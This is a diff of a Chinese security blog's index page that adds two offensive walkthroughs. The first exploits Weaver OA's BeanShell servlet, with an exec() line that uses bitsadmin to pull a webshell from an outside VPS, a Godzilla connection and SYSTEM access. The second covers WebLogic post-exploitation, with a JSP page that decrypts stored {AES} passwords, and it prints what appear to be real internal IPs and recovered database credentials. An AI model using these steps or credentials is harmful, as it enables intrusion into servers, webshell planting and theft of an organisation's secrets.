@@ -71,6 +71,122 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-BeanShell任意命令执行" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time class="dt-published" datetime="2022-11-26T02:26:33.000Z" itemprop="datePublished">2022-11-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">BeanShell任意命令执行</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="http://www.beanshell.org/manual/bshcommands.html">beanshell官方文档</a></p>
+<h2 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h2><p>他是Java语法规范的脚本语言，可以用来执行他本身预设的命令和函数，正因为那些命令和函数，攻击者可以构造有威胁的命令，对信息系统造成威胁。</p>
+<h2 id="哪些适用（规则）"><a href="#哪些适用（规则）" class="headerlink" title="哪些适用（规则）"></a>哪些适用（规则）</h2><p>uri带有以下内容，我这里举例子的是关于OA的uri</p>
+<ul>
+<li>&#x2F;weaver&#x2F;bsh.servlet.BshServlet</li>
+<li>&#x2F;servlet&#x2F;~ic&#x2F;bsh.servlet.BshServlet</li>
+</ul>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>具体更多玩法看<a target="_blank" rel="noopener" href="http://www.beanshell.org/manual/bshcommands.html">beanshell官方文档</a>，以下使用简单的exec() dir()函数作为样例。</p>
+<h4 id="查看当前目录，并找到web目录"><a href="#查看当前目录，并找到web目录" class="headerlink" title="查看当前目录，并找到web目录"></a>查看当前目录，并找到web目录</h4><ol>
+<li>dir(“&#x2F;sdfasf”) 输入让他报错，就能返回当前路径;<br><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png"></li>
+<li>这里就是web的根目录，绝对路径为”D:\weaver\ecology”；<br><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png"></li>
+</ol>
+<h2 id="写shell😈"><a href="#写shell😈" class="headerlink" title="写shell😈"></a>写shell😈</h2><p>现在我们已经知道了web的绝对路径，我们就可以尝试写入webshell，更方便我们利用该漏洞。你可以使用echo写入，也可以远程下载，我这里使用的是远程下载方法。</p>
+<ol>
+<li>在实战过程中，你需要将webshell放置到云vps中，并且启动一个webserver，让受害者可以http形式访问到并且下载木马，输入以下指令到Script框中并执行。Output中没有报错证明指令执行成功。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;bitsadmin /rawreturn /transfer down http://9.9.9.9:8000/2.jsp d:\\weaver\\ecology\\123.jsp&quot;</span>)</span><br></pre></td></tr></table></figure>
+<img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png"></li>
+</ol>
+<h2 id="连shell"><a href="#连shell" class="headerlink" title="连shell"></a>连shell</h2><p>连接取决于你使用的什么webshell，如果你用一句话webshell那么可以使用蚁剑、菜刀等工具，我这里使用的是哥斯拉。如下图输入webshell的url和连接密码之后测试成功之后证明你的木马上传成功了，可以连接到webshel尽情玩耍了😄。<br><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png"></p>
+<h2 id="用shell"><a href="#用shell" class="headerlink" title="用shell"></a>用shell</h2><p>我这里使用哥斯拉试一个简单的命令，whoami查看当前权限，看到为system权限。权限比较高，可以继续对该站点内网进行渗透省着提权了👏。<br><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png"></p>
+<h2 id="小tips（还会更新）"><a href="#小tips（还会更新）" class="headerlink" title="小tips（还会更新）"></a>小tips（还会更新）</h2><p>weaver&#x2F;ecology&#x2F;web-inf&#x2F;prop&#x2F;weaver.properties 数据库账号密码</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cll0r0oec0000j0hfckrvhjs7" data-title="BeanShell任意命令执行" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Weblogic内网渗透tips" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/11/24/Weblogic%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Ftips/" class="article-date">
+  <time class="dt-published" datetime="2022-11-24T01:56:48.000Z" itemprop="datePublished">2022-11-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/11/24/Weblogic%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Ftips/">Weblogic内网渗透tips</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="ping-8-8-8-8出网，但是c2不出网？"><a href="#ping-8-8-8-8出网，但是c2不出网？" class="headerlink" title="ping 8.8.8.8出网，但是c2不出网？"></a>ping 8.8.8.8出网，但是c2不出网？</h2><h1 id="weblogic技战法"><a href="#weblogic技战法" class="headerlink" title="weblogic技战法"></a>weblogic技战法</h1><p>当可以对weblogic文件读取、命令执行后,可以采取上传webshell等操作.本次内容主要应对想登陆weblogic后台等情况,可以采取读取系统配置的密码并解密登陆后台进行后续攻击.</p>
+<h2 id="拿到加密密码"><a href="#拿到加密密码" class="headerlink" title="拿到加密密码"></a>拿到加密密码</h2><ol>
+<li>执行命令: grep -R “{AES}” ,并读取{AES}…………部分.<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[oracle@47be61a62209 base_domain]$ grep -R <span class="string">&quot;&#123;AES&#125;&quot;</span></span><br><span class="line">config/config.xml:    &lt;credential-encrypted&gt;&#123;AES&#125;4lF4nqZWkUJ4567ypRjhXouID15EikshgwXlTn2XBCbSFIfSzkMNn4/wvML3f1r0LLZAggmORlI9EyF+U1GrUYwFoazvYq648/zPhHkyYl2R5OPhoEJcoe3olR3IiZ/U&lt;/credential-encrypted&gt;</span><br><span class="line">config/config.xml:    &lt;node-manager-password-encrypted&gt;&#123;AES&#125;aMj627ml8lP6TAGipIu47rFwThbsAYyHy44DkIJTgLs=&lt;/node-manager-password-encrypted&gt;</span><br><span class="line">config/config.xml:    &lt;credential-encrypted&gt;&#123;AES&#125;2jZbC6NiWNI96lMC0S+3Ppq8uPUqT2Yi5JnVBfxVEvlJEQrQ82HzRmW0yYJRVF0y&lt;/credential-encrypted&gt;</span><br><span class="line">init-info/config-nodemanager.xml:  &lt;nod:password&gt;&#123;AES&#125;bDqxjLcpNOJLpJ8GnDu5bv/4ToyZfs1i7GNjkUZG2a0=&lt;/nod:password&gt;</span><br><span class="line">servers/AdminServer/security/boot.properties:password=&#123;AES&#125;errqUDU4uv837h/rxdpGici4JPpsn+2fZpQRxnHhXYs\=</span><br><span class="line">servers/AdminServer/security/boot.properties:username=&#123;AES&#125;4l2uRcGscFsr0aS4MGTASdVDAZ8nGX8+72ODo8gK2k8\=</span><br><span class="line">edit.lok:creator=&#123;AES&#125;egG3ZQivBJDRKD5IboKoo6orcdYWHtLNYke3ik8FDfA\=</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><ol>
+<li>wlfullclient.jar and jarbuilder are deprecated starting from the WebLogic 12.1.3 release.</li>
+</ol>
+<h2 id="登陆weblogic后台"><a href="#登陆weblogic后台" class="headerlink" title="登陆weblogic后台"></a>登陆weblogic后台</h2><p>weblogic 在线与离线解密<br>如有webshell可进行在线解密<br>把以下代码放入服务器进行访问，s&#x3D;””中填写weblogic的加密密码，可在boot.properties文件中找到。默认路径为..&#x2F;..&#x2F;..&#x2F;Server&#x2F;security&#x2F;boot.properties</p>
+<p>#Sat Mar 31 19:36:34 CST 2018<br>password&#x3D;{AES}B5azehvTFE00Ln88jynWCZq+Srddca7MYHEswtxwtBs=<br>username&#x3D;{AES}y47BedaLa4o2qU7v+sJZizMOVghLhxaWXFjwj8vCFf8=</p>
+<p>#Tue Jan 08 17:37:06 CST 2019<br>password&#x3D;{AES}xt7IIkDgw29&#x2F;KqQEJY&#x2F;A0VVR&#x2F;M0UBHEk&#x2F;PLVQDo9Gkg=<br>username&#x3D;{AES}ThYjAwTUtX&#x2F;DUpLXfPO6bsVib&#x2F;Kmze&#x2F;aG2o6EPHpxgI=</p>
+<h4 id="搜索Jsp可执行目录"><a href="#搜索Jsp可执行目录" class="headerlink" title="搜索Jsp可执行目录"></a>搜索Jsp可执行目录</h4><ol>
+<li>find &#x2F; -type f -name login.css 并放置webshell</li>
+<li><a target="_blank" rel="noopener" href="http://8.8.8.8:9001/console/css/login.jsp">http://8.8.8.8:9001/console/css/login.jsp</a><br>login.jsp内容<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> pageEncoding=<span class="string">&quot;utf-8&quot;</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;weblogic.security.internal.*,weblogic.security.internal.encryption.*&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">   <span class="type">EncryptionService</span> <span class="variable">es</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="type">ClearOrEncryptedService</span> <span class="variable">ces</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    s= request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">    es = SerializedSystemIni.getEncryptionService();</span><br><span class="line">    <span class="keyword">if</span> (es == <span class="literal">null</span>) &#123;</span><br><span class="line">       out.println(<span class="string">&quot;Unable to initialize encryption service&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ces = <span class="keyword">new</span> <span class="title class_">ClearOrEncryptedService</span>(es);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="literal">null</span>) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;\nDecrypted Password is:&quot;</span> + ces.decrypt(s));</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>10.103.102.140</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jdbc-data-source</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.oracle.com/weblogic/jdbc-data-source&quot;</span> <span class="attr">xmlns:sec</span>=<span class="string">&quot;http://xmlns.oracle.com/weblogic/security&quot;</span> <span class="attr">xmlns:wls</span>=<span class="string">&quot;http://xmlns.oracle.com/weblogic/security/wls&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.oracle.com/weblogic/jdbc-data-source http://xmlns.oracle.com/weblogic/jdbc-data-source/1.2/jdbc-data-source.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mdm<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jdbc-driver-params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>jdbc:oracle:thin:@(DESCRIPTION =    (ADDRESS = (PROTOCOL = TCP)(HOST = 10.103.102.140)(PORT = 1521))    (CONNECT_DATA =      (SERVER = DEDICATED)      (SERVICE_NAME = sydevpdb)    ))<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">driver-name</span>&gt;</span>oracle.jdbc.OracleDriver<span class="tag">&lt;/<span class="name">driver-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>user<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>MS_MDM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password-encrypted</span>&gt;</span>&#123;AES&#125;EqQfdzHrlqR2lg/wH6FPmpOB4ZpPVp1CuMzJZIZfvr4=<span class="tag">&lt;/<span class="name">password-encrypted</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">jdbc-driver-params</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jdbc-connection-pool-params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test-table-name</span>&gt;</span>SQL SELECT 1 FROM DUAL<span class="tag">&lt;/<span class="name">test-table-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">jdbc-connection-pool-params</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jdbc-data-source-params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jndi-name</span>&gt;</span>ls/uap/ms_mdm<span class="tag">&lt;/<span class="name">jndi-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">global-transactions-protocol</span>&gt;</span>OnePhaseCommit<span class="tag">&lt;/<span class="name">global-transactions-protocol</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">jdbc-data-source-params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jdbc-data-source</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据配置文件获取链接参数<br>    database:sydevpdb<br>    username:ms_mdm<br>    password:MS_MDM_test#1</p>
+<p>MS_ARC&#x2F;MS_ARC_test#1<br>LSPF_I18N&#x2F;LSPF_I18N_test#1<br>bsp&#x2F;bsp_test#1<br>LSPF_SUPPORT&#x2F;LSPF_SUPPORT_test#1</p>
+<p>密码目：&#x2F;u01&#x2F;weblogic&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;domainsy&#x2F;init-info&#x2F;security.xml</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dhayser.github.io/2022/11/24/Weblogic%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Ftips/" data-id="cll0r0oej000fj0hf45rj1tir" data-title="Weblogic内网渗透tips" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-BurpSuite插件开发" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/11/22/BurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" class="article-date">
@@ -105,7 +221,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/22/BurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" data-id="clfbvyy8m0002d0hfar3qbi0p" data-title="BurpSuite插件开发" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/22/BurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" data-id="cll0r0oee0001j0hfechgbfqx" data-title="BurpSuite插件开发" class="article-share-link">Share</a>
       
       
       
@@ -211,7 +327,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/15/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/" data-id="clfbvyy8n0007d0hfh1aweyjq" data-title="Fastjson反序列化漏洞原理及(出/不出网)检测利用" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/15/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/" data-id="cll0r0oej000gj0hf72wm14cg" data-title="Fastjson反序列化漏洞原理及(出/不出网)检测利用" class="article-share-link">Share</a>
       
       
       
@@ -251,7 +367,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/11/%E9%9D%9E%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" data-id="clfbvyy8q000ed0hf1zje43y7" data-title="非授权访问漏洞" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/11/%E9%9D%9E%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" data-id="cll0r0oej000ej0hf8gqm34w7" data-title="非授权访问漏洞" class="article-share-link">Share</a>
       
       
       
@@ -292,7 +408,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/08/%E8%AE%BE%E5%A4%87%E7%BC%BA%E7%9C%81%E5%8F%A3%E4%BB%A4/" data-id="clfbvyy8p000dd0hfe0tv1y7d" data-title="设备缺省口令" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/08/%E8%AE%BE%E5%A4%87%E7%BC%BA%E7%9C%81%E5%8F%A3%E4%BB%A4/" data-id="cll0r0oej000dj0hfgla17haf" data-title="设备缺省口令" class="article-share-link">Share</a>
       
       
       
@@ -340,7 +456,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/06/curl%E5%B7%A5%E5%85%B7%E8%BF%9E%E6%8E%A5webshell%E8%B0%83%E8%AF%95/" data-id="clfbvyy8p000cd0hfbxb78lpp" data-title="curl工具连接webshell调试" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/06/curl%E5%B7%A5%E5%85%B7%E8%BF%9E%E6%8E%A5webshell%E8%B0%83%E8%AF%95/" data-id="cll0r0oei0009j0hfhyqnhent" data-title="curl工具连接webshell调试" class="article-share-link">Share</a>
       
       
       
@@ -375,7 +491,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a></li></ul>
     </div>
   </div>
 
@@ -388,6 +504,14 @@
       <ul>
         
           <li>
+            <a href="/2023/08/07/Nacos%E5%90%8E%E6%B8%97%E9%80%8F/">Nacos后渗透</a>
+          </li>
+        
+          <li>
+            <a href="/2023/03/21/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/">流量包分析</a>
+          </li>
+        
+          <li>
             <a href="/2023/03/17/NetSarang%E4%BA%A7%E5%93%81%E7%BA%BF%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/">NetSarang产品线后门分析</a>
           </li>
         
@@ -397,14 +521,6 @@
         
           <li>
             <a href="/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">Spring Boot漏洞分析与利用</a>
-          </li>
-        
-          <li>
-            <a href="/2022/12/25/Buuctf-Secret-File/">Buuctf-Secret File</a>
-          </li>
-        
-          <li>
-            <a href="/2022/12/23/CVE-2020-1472%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">CVE-2020-1472复现分析</a>
           </li>
         
       </ul>
